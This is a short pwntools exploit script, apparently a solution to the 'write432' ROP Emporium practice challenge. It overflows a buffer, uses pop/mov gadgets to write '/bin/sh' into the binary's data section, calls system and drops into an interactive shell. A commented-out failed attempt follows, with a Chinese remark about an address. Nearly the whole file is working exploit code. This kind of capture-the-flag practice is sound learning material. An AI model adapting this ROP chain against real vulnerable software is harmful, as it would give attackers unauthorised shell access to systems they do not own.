from pwn import *
context.log_level = 'debug'
sh = process("./write432")
elf = ELF("./write432")
system = elf.plt['system']
print(hex(system))
sh.recv()
data_addr = 0x0804A028
mov_edi_ebp_ret = 0x08048670    # 0x08048670 : mov dword ptr [edi], ebp ; ret
pop_edi_ebp_ret = 0x080486da    # 0x080486da : pop edi ; pop ebp ; ret

payload = b"a" * 0x2c
payload += p32(pop_edi_ebp_ret) + p32(data_addr) + bytes("/bin", encoding="ascii") + p32(mov_edi_ebp_ret)
payload += p32(pop_edi_ebp_ret) + p32(data_addr+4) + bytes("/sh\x00", encoding="ascii") + p32(mov_edi_ebp_ret)
payload += p32(system) + b"b" * 4 + p32(data_addr)
sh.sendline(payload)
sh.interactive()


# binsh = "/bin/sh"
# s_addr = 0xffffce3c+12  # readelf -S write432 -> .rodate 不可写,不知道人家哪来的地址
# +12是写入的binsh与s_addr的相对位置
# payload = flat(b'a' * 0x2c, p32(system), b'b' * 4, p32(s_addr), binsh)
